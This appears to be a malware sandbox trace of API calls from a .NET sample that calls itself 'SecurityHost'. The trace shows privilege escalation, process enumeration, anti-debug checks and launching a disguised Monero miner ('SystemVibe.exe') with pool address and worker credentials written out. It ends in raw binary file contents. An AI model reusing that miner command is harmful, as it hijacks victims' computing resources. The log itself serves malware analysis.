+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ConfigMask#0x0000014c#ConfigMask#4#4361,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ConfigString#0x0000014c#ConfigString#1#,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\MVID#0x0000014c#MVID#3#$oZ»hkÍò-5°ê,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\EvalationData#0x0000014c#EvalationData#0#,2,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\Status#0x0000014c#Status#4#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\ILDependencies#0x0000014c#ILDependencies#3#BÊøe4e          |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\NIDependencies#0x0000014c#NIDependencies#0#,2,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\MissingDependencies#0x0000014c#MissingDependencies#0#,2,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#IL\1499ca42\653465f8\1#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\DisplayName#0x0000014c#DisplayName#1#mscorlib,4.0.0.0,,b77a5c561934e089|,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\Status#0x0000014c#Status#4#8198,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\Modules#0x0000014c#Modules#1#normidna.nlp||normnfc.nlp||normnfd.nlp||normnfkc.nlp||normnfkd.nlp|,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\SIG#0x0000014c#SIG#3#×N½7s@Qî%­§º×ØxxRkên!+HXØ@F|,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\TargetedPatchBand#0x0000014c#TargetedPatchBand#3#1.0.21-0                         |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\1499ca42\653465f8\1\LastModTime#0x0000014c#LastModTime#3#%KÂpaÓ,0,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\GACChangeNotification\Default\System,4.0.0.0,,b77a5c561934e089,MSIL#0x00000108#System,4.0.0.0,,b77a5c561934e089,MSIL#3#zÂpaÓ|,0,1542888185.578625
+GetFileAttributesW,32#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll,32,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System.Configuration__b03f5f7f11d50a3a#0x00000144#0,2,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\GACChangeNotification\Default\System.Configuration,4.0.0.0,,b03f5f7f11d50a3a,MSIL#0x00000108#System.Configuration,4.0.0.0,,b03f5f7f11d50a3a,MSIL#3#èvÂpaÓ|,0,1542888185.578625
+GetFileAttributesW,32#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Configuration\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.dll#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Configuration\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.dll,32,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System.Xml__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System.Xml__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System.Xml__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System.Xml__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System.Xml__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System.Xml__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System.Xml__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System.Xml__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\GACChangeNotification\Default\System.Xml,4.0.0.0,,b77a5c561934e089,MSIL#0x00000108#System.Xml,4.0.0.0,,b77a5c561934e089,MSIL#3#¤ªÂpaÓ|,0,1542888185.578625
+GetFileAttributesW,32#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.dll#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.dll,32,1542888185.578625
+GetSystemInfo,1,0,1542888185.578625
+GetSystemInfo,1,0,1542888185.578625
+SetErrorMode,32769,32775,1542888185.578625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x67ad0000#4#0,0,1542888185.593625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x67ad0000#2#0,0,1542888185.593625
+LdrLoadDll,0#C:\Windows\assembly\NativeImages_v4.0.30319_32\System\964da027ebca3b263a05cadb8eaa20a3\System.ni.dll#0#System.ni#0x67ad0000,0,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+GetSystemInfo,1,0,1542888185.593625
+GetSystemInfo,1,0,1542888185.593625
+GetSystemInfo,1,0,1542888185.593625
+GetSystemInfo,1,0,1542888185.593625
+FindFirstFileExW,C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.INI#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.INI,4294967295,1542888185.593625
+RegOpenKeyExW,0x00000000#SOFTWARE\Microsoft\.NETFramework\Policy\APTCA#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy\APTCA#0x80000002#0,2,1542888185.593625
+GetSystemInfo,1,0,1542888185.593625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00444000#4096#64#0,0,1542888185.593625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01480000#8192#1#0,0,1542888185.593625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x01480000#4096#64#0,0,1542888185.593625
+LdrGetProcedureAddress,GetConsoleWindow#KERNEL32#0x76114032#0#0x760b0000,0,1542888185.593625
+SetErrorMode,32769,32775,1542888185.593625
+LdrLoadDll,0#user32.dll#0#user32#0x77960000,0,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+LdrGetProcedureAddress,ShowWindow#USER32#0x7796f2a9#0#0x77960000,0,1542888185.593625
+SetErrorMode,32769,32775,1542888185.593625
+LdrLoadDll,0#advapi32.dll#0#advapi32#0x77730000,0,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+LdrGetProcedureAddress,LookupPrivilegeValue#ADVAPI32#0x67cd4c0b#0#0x77730000,3221225785,1542888185.593625
+LdrGetProcedureAddress,LookupPrivilegeValueW#ADVAPI32#0x777441b3#0#0x77730000,0,1542888185.593625
+LookupPrivilegeValueW,#SeDebugPrivilege,1,1542888185.593625
+LdrGetProcedureAddress,GetCurrentProcess#KERNEL32#0x760fd7a0#0#0x760b0000,0,1542888185.593625
+LdrGetProcedureAddress,OpenProcessToken#ADVAPI32#0x77744304#0#0x77730000,0,1542888185.593625
+LdrGetProcedureAddress,OpenProcessTokenW#ADVAPI32#0x002cdab1#0#0x77730000,3221225785,1542888185.593625
+LdrGetProcedureAddress,AdjustTokenPrivileges#ADVAPI32#0x7774418e#0#0x77730000,0,1542888185.593625
+LdrGetProcedureAddress,AdjustTokenPrivilegesW#ADVAPI32#0x002cdaa1#0#0x77730000,3221225785,1542888185.593625
+LdrGetProcedureAddress,CloseHandle#KERNEL32#0x760fe868#0#0x760b0000,0,1542888185.593625
+NtClose,0x00000194,0,1542888185.593625
+NtAllocateVirtualMemory,0#0#1776#81920#0xffffffff#0x02902000#4096#4#0,0,1542888185.593625
+SetErrorMode,32769,32775,1542888185.593625
+LdrLoadDll,0#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\ntdll.dll#0#ntdll#0x00000000,3221225781,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+SetErrorMode,32769,32775,1542888185.593625
+LdrLoadDll,0#ntdll.dll#0#ntdll#0x77a30000,0,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+LdrGetProcedureAddress,NtQuerySystemInformation#ntdll#0x77a761f8#0#0x77a30000,0,1542888185.593625
+LdrGetProcedureAddress,NtQuerySystemInformationW#ntdll#0x002ce6b1#0#0x77a30000,3221225785,1542888185.593625
+NtQuerySystemInformation,5,0,1542888185.593625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01902000#4096#4#0,0,1542888185.593625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x0066a000#4096#64#0,0,1542888185.593625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00667000#4096#64#0,0,1542888185.593625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01912000#4096#4#0,0,1542888185.593625
+NtClose,0x00000194,0,1542888185.593625
+NtDuplicateObject,0#1776#2#0x00000198#0xfffffffe#0x00000000#0xffffffff#0xffffffff#1776,0,1542888185.593625
+SetErrorMode,32769,32775,1542888185.593625
+LdrLoadDll,0#ole32.dll#0#ole32#0x76540000,0,1542888185.593625
+SetErrorMode,32775,32773,1542888185.593625
+LdrGetProcedureAddress,CoGetContextToken#ole32#0x7657ecab#0#0x76540000,0,1542888185.593625
+LdrUnloadDll,ole32#0x76540000,0,1542888185.593625
+CoInitializeEx,0,0,1542888185.593625
+NtDelayExecution,500#0,0,1542888186.093625
+NtDelayExecution,500#0,0,1542888186.593625
+NtDelayExecution,500#0,0,1542888187.093625
+NtDelayExecution,500#0,0,1542888187.593625
+NtDelayExecution,500#0,0,1542888188.093625
+NtDelayExecution,500#0,0,1542888188.593625
+LdrGetProcedureAddress,CloseHandle#KERNEL32#0x760fe868#0#0x760b0000,0,1542888188.593625
+LdrGetProcedureAddress,CloseHandle#KERNEL32#0x760fe868#0#0x760b0000,0,1542888188.593625
+LdrGetProcedureAddress,GetCurrentDirectory#KERNEL32#0x6869b099#0#0x760b0000,3221225785,1542888188.593625
+LdrGetProcedureAddress,GetCurrentDirectoryW#KERNEL32#0x7610b88f#0#0x760b0000,0,1542888188.593625
+SetErrorMode,32769,32775,1542888188.593625
+LdrLoadDll,0#ole32.dll#0#ole32#0x76540000,0,1542888188.593625
+SetErrorMode,32775,32773,1542888188.593625
+LdrGetProcedureAddress,CoTaskMemAlloc#ole32#0x7658ea4c#0#0x76540000,0,1542888188.593625
+LdrGetProcedureAddress,CoTaskMemFree#ole32#0x76596f41#0#0x76540000,0,1542888188.593625
+LdrGetProcedureAddress,CreateProcess#KERNEL32#0x67cd4b08#0#0x760b0000,3221225785,1542888188.593625
+LdrGetProcedureAddress,CreateProcessW#KERNEL32#0x760b204d#0#0x760b0000,0,1542888188.593625
+CreateProcessInternalW,C:\Users\mag\AppData\Local\Temp#0##0x00000000#"C:\ProgramData\system86\SystemVibe.exe" -o stratum+tcp://xmr.pool.minergate.com:45560 -O   xariton.asadullin.81@inbox.ru:x --max-cpu-usage=50 -k -r1 -R1 --donate-level=1 --print-time=10#0x00000000#0#0#0#1#134217728#,0,1542888188.593625
+LdrGetProcedureAddress,FormatMessage#KERNEL32#0x67cd483e#0#0x760b0000,3221225785,1542888188.593625
+LdrGetProcedureAddress,FormatMessageW#KERNEL32#0x760f8e18#0#0x760b0000,0,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x000001a8#0x02000000#HKEY_CURRENT_USER,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_CURRENT_USER\Control Panel\Desktop\MuiCached\MachineLanguageConfiguration,3221225524,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MUI\Settings,3221225524,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x000001a8#0x02000000#HKEY_CURRENT_USER,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_CURRENT_USER\Software\Policies\Microsoft\Control Panel\Desktop,3221225524,1542888188.593625
+NtOpenKey,0x000001ac#0x00020019#HKEY_CURRENT_USER\Control Panel\Desktop\LanguageConfiguration,0,1542888188.593625
+NtEnumerateValueKey,0##1#HKEY_CURRENT_USER\Control Panel\Desktop\LanguageConfiguration#0x000001ac#0#,2147483674,1542888188.593625
+NtClose,0x000001ac,0,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MUI\Settings,3221225524,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x000001a8#0x02000000#HKEY_CURRENT_USER,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_CURRENT_USER\Software\Policies\Microsoft\Control Panel\Desktop,3221225524,1542888188.593625
+NtOpenKey,0x000001ac#0x00020019#HKEY_CURRENT_USER\Control Panel\Desktop,0,1542888188.593625
+NtQueryValueKey,0x000001ac##2#HKEY_CURRENT_USER\Control Panel\Desktop\PreferredUILanguages#0#,3221225524,1542888188.593625
+NtClose,0x000001ac,0,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x00000000#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MUI\Settings,3221225524,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x000001a8#0x02000000#HKEY_CURRENT_USER,0,1542888188.593625
+NtOpenKey,0x000001ac#0x00020019#HKEY_CURRENT_USER\Control Panel\Desktop\MuiCached,0,1542888188.593625
+NtQueryValueKey,0x000001ac##2#HKEY_CURRENT_USER\Control Panel\Desktop\MuiCached\MachinePreferredUILanguages#0#,2147483653,1542888188.593625
+NtQueryValueKey,0x000001ac##2#HKEY_CURRENT_USER\Control Panel\Desktop\MuiCached\MachinePreferredUILanguages#7#en-US,0,1542888188.593625
+NtClose,0x000001ac,0,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtOpenKey,0x000001a8#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\CMF\Config,0,1542888188.593625
+NtQueryValueKey,0x000001a8##2#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\CMF\Config\SYSTEM#4#0,0,1542888188.593625
+NtClose,0x000001a8,0,1542888188.593625
+NtCreateFile,0#1#5#0#1#0x000001a8#0x80100080#\??\C:\Windows\system32\en-US\KERNELBASE.dll.mui#C:\Windows\System32\en-US\KERNELBASE.dll.mui,0,1542888188.593625
+NtCreateSection,8#0x000001ac#0x00000000#0x000001a8#0x000f0005#,0,1542888188.593625
+NtMapViewOfSection,0#0#1776#786432#0xffffffff#0x000001ac#0x01490000##0#8,0,1542888188.593625
+NtClose,0x000001ac,0,1542888188.593625
+NtOpenKey,0x000001ac#0x00000001#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Windows Error Reporting\WMR,0,1542888188.593625
+NtQueryValueKey,0x000001ac##2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting\WMR\Disable#4#1,0,1542888188.593625
+NtClose,0x000001ac,0,1542888188.593625
+SetErrorMode,32769,32775,1542888188.656625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\VERSION.dll#0#VERSION#0x00000000,3221225781,1542888188.656625
+SetErrorMode,32775,32773,1542888188.656625
+LdrLoadDll,0#VERSION.dll#0#VERSION#0x750b0000,0,1542888188.656625
+LdrGetProcedureAddress,GetFileVersionInfoSizeW#VERSION#0x750b19d9#0#0x750b0000,0,1542888188.656625
+GetFileVersionInfoSizeW,493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,1788,1542888188.656625
+LdrGetProcedureAddress,GetFileVersionInfoW#VERSION#0x750b19f4#0#0x750b0000,0,1542888188.656625
+GetFileVersionInfoW,|||4   V S _ V E R S I O N _ I N F O     ½ïþ           ?                         D    V a r F i l e I n f o     $    T r a n s l a t i o n       °Ü   S t r i n g F i l e I n f o   ¸   0 0 0 0 0 4 b 0   2   C o m m e n t s   S e c u r i t y H o s t     :   C o m p a n y N a m e     S e c u r i t y H o s t     B   F i l e D e s c r i p t i o n     S e c u r i t y H o s t     0   F i l e V e r s i o n     4 . 4 . 6 . 7   B   I n t e r n a l N a m e   S e c u r i t y H o s t . e x e     >   L e g a l C o p y r i g h t   S e c u r i t y H o s t     B   L e g a l T r a d e m a r k s     S e c u r i t y H o s t     J   O r i g i n a l F i l e n a m e   S e c u r i t y H o s t . e x e     :   P r o d u c t N a m e     S e c u r i t y H o s t     4   P r o d u c t V e r s i o n   4 . 4 . 6 . 7   8   A s s e m b l y   V e r s i o n   2 . 6 . 6 . 5   FE2XìÞcE UØ,   uÜcÿÿÿÿ8Ö,  Ö,    ß, ÿ        ÿÿÿÿXÖ, LÖ, ÈuÜcÿÿÿÿ  U      l×, ùâc||Ö, çËÜc  U      zÜc           ü  Ö,  UÖ, @TÜc U    ¼Ö, ¡üÞcl×,     ¼Ö, wýÞc Uß, ÜÖ, z2Ücàråc UÜÖ, 4ïÞc U           }ÊÜc   ¼Ø, KÜcl×,     ß, D   fafbef6d        d634c4c05eb.exe                                                                                                                        ×, *                                                                                                                               2 ßuàØ,     XØ,  u±u²JÛïÿ   ß,       5    (Ø,    TÙ, gHuRüþÿÿÿ±ubÞc   ß, ||        u4¿siß, driøØ, 5 À~   ¨fiÅû¯ëÿ    ðý¼Ø, ï~Üc   Pâc       ß,     Ù, ÛÞcèØ,    ü          èØ, ß,         5 À    ü          ²@,iÙuri¸á, `Ù, 6<,iß, H<,i]ú¯ëÿ   ß,                             ü       Ê ðÙ, \Ú, aiiÿÿÿÿß, Ù,    #493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe|,1,1542888188.656625
+LdrGetProcedureAddress,VerQueryValueW#VERSION#0x750b1b51#0#0x750b0000,0,1542888188.656625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x015b1000#4096#64#0,0,1542888188.656625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x015b2000#4096#64#0,0,1542888188.656625
+IsDebuggerPresent,,0,1542888188.656625
+IsDebuggerPresent,,0,1542888188.656625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888188.656625
+LdrGetProcedureAddress,LCIDToLocaleName#KERNEL32#0x760e564f#0#0x760b0000,0,1542888188.656625
+NtQueryAttributesFile,C:\Windows\Microsoft.NET\Framework\v4.0.30319\en-US\mscorrc.dll#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\en-US\mscorrc.dll,3221225524,1542888188.656625
+NtQueryAttributesFile,C:\Windows\Microsoft.NET\Framework\v4.0.30319\en-US\mscorrc.dll.DLL#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\en-US\mscorrc.dll.DLL,3221225524,1542888188.656625
+NtQueryAttributesFile,C:\Windows\Microsoft.NET\Framework\v4.0.30319\en\mscorrc.dll#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\en\mscorrc.dll,3221225530,1542888188.656625
+NtQueryAttributesFile,C:\Windows\Microsoft.NET\Framework\v4.0.30319\en\mscorrc.dll.DLL#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\en\mscorrc.dll.DLL,3221225530,1542888188.656625
+NtQueryAttributesFile,C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorrc.dll#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorrc.dll,0,1542888188.656625
+NtCreateFile,0#1#5#96#1#0x000001ac#0x80100080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorrc.dll#C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorrc.dll,0,1542888188.656625
+NtCreateSection,2#0x000001b0#0x00000000#0x000001ac#0x000f0005#,0,1542888188.656625
+NtMapViewOfSection,0#0#1776#372736#0xffffffff#0x000001b0#0x01550000##0#2,0,1542888188.656625
+NtClose,0x000001ac,0,1542888188.656625
+NtClose,0x000001b0,0,1542888188.656625
+LoadStringW,0x01550001#8322#Application: ,13,1542888188.671625
+LoadStringW,0x01550001#8324#Framework Version: ,19,1542888188.671625
+LoadStringW,0x01550001#8325#Description: The process was terminated due to an unhandled exception.,70,1542888188.671625
+LoadStringW,0x01550001#8326#Exception Info: ,16,1542888188.671625
+LoadStringW,0x01550001#8331#Stack:,6,1542888188.671625
+LoadStringW,0x01550001#8332#at,2,1542888188.671625
+NtAllocateVirtualMemory,0#0#1776#524288#0xffffffff#0x015f0000#8192#4#0,0,1542888188.671625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x015f0000#4096#4#0,0,1542888188.671625
+GetComputerNameA,MAG-PC,1,1542888188.671625
+GetComputerNameW,MAG-PC,1,1542888188.671625
+LoadStringW,0x01550001#6140#Unhandled Exception:,20,1542888188.671625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x015b3000#4096#64#0,0,1542888188.671625
+RegOpenKeyExW,0x000001b6#CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32#0x00020019#HKEY_CLASSES_ROOT\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32#0x80000000#0,0,1542888188.671625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\(Default)#0x000001b6##1#,0,1542888188.671625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\(Default)#0x000001b6##1#mscoree.dll,0,1542888188.671625
+RegCloseKey,0x000001b6,0,1542888188.671625
+RegOpenKeyExW,0x000001b6#CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server#0x00020019#HKEY_CLASSES_ROOT\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server#0x80000000#0,0,1542888188.671625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server\(Default)#0x000001b6##1#,0,1542888188.671625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server\(Default)#0x000001b6##1#diasymreader.dll,0,1542888188.671625
+RegCloseKey,0x000001b6,0,1542888188.671625
+GetSystemInfo,1,0,1542888188.749625
+NtAllocateVirtualMemory,0#0#1776#16384#0xffffffff#0x01473000#4096#4#0,0,1542888188.749625
+NtAllocateVirtualMemory,0#0#1776#28672#0xffffffff#0x01477000#4096#4#0,0,1542888188.749625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x0147e000#4096#4#0,0,1542888188.749625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\diasymreader.dll#0#diasymreader#0x6ad10000,0,1542888188.749625
+LdrGetProcedureAddress,DllGetClassObject#diasymreader#0x6ad1d031#0#0x6ad10000,0,1542888188.749625
+SetErrorMode,32769,32775,1542888188.749625
+NtCreateFile,128#1#1#96#1#0x000001b4#0x80100080#\??\C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll,0,1542888188.749625
+GetFileType,0x000001b4,1,1542888188.749625
+SetFilePointer,0#0x000001b4#0,0,1542888188.749625
+NtAllocateVirtualMemory,0#0#1776#1048576#0xffffffff#0x016b0000#8192#4#0,0,1542888188.749625
+NtAllocateVirtualMemory,0#0#1776#12288#0xffffffff#0x016b0000#4096#4#0,0,1542888188.749625
+NtReadFile,|0#MZ       ÿÿ  ¸       @                                      º ´	Í!¸LÍ!This program cannot be run in DOS mode.
+$       PE  L ôß¡K        à "   .        .      @.   z                      `5    ÏP5  @                           Æ. O    @.  ü          
+5 H   @5    T.                                                              H           .text   þ.      .                   `.rsrc    ü  @.  þ  
+.             @  @.reloc      @5     5             @  B                ú.     H     Ì- º 	       Tè* ( Ô.                                    (g  
+**(  **(  *  0 Ó    (g  
+-rµ psh  
+z2
+c,rÅ psi  
+z    _, ôüÿÿ_,rÅ psi  
+z    _,(j  
+ok  
++(l  
+ok  
+ (m  
+(n  
+¢rÕ p¢¢rÕ p¢¢(o  
+	(7  }  }  -h{  (2 
+{p% }  {q% }  (ß2 }
+  {
+  {0  }  {
+  {1  }  (2  
+,q	(8  +g{  }  {  }  {  }  {  }  {  }
+  {  }  {  }  {  }	  }  (3  ,9{  -1{
+  {  (5  }  ,,{  o@  }
+  *vrµ pop  
+rÅ poq  
+(  *¢rµ pok  
+or  
+rÅ p(    or  
+*V-rÙ psh  
+z(2 *V-rÙ psh  
+z(2 *~  *   0 `     /rá psi  
+z  ~  os  
+~  19
+~  % (t  
++
+~  ou  
+~  os  
+~  0åÞ
+,(v  
+Ü*   ( -U 
+    {  *(4  *{  *0 X     {  -*{   
++(j  
+(w  
+¢X2ê+${  i 
+{  {  i(x  
+*0 i     {  - {   
++X2ô+?{  oy  
+ 
+{  oz  
++	o1  
+¥ 	o/  
+¥ 	o   
+-à*   0 q     {  - 2{  /(j  
+(n  
+*~{  
+*{  ,#{   o||  
+
